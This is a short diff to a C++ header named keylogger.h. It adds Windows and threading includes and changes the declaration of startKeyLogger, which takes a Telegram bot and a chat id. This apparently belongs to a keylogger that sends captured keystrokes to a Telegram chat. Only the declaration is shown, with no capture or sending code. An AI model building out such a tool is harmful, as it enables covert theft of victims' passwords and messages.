@@ -1,10 +1,16 @@
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
+#define WIN32_LEAN_AND_MEAN
 #include <iostream>
-#include <tgbot/tgbot.h>
+#include <fstream>
+#include <unordered_map>
+#include <thread>
+#include <chrono>
+#include <windows.h>
+#include "tgbot/tgbot.h"
 #include "globals.h"
 
-void startKeyLogger(const TgBot::Bot& bot_ref, const int64_t chat_id);
+void startKeyLogger(TgBot::Bot& bot, int64_t chatId);
 
 #endif
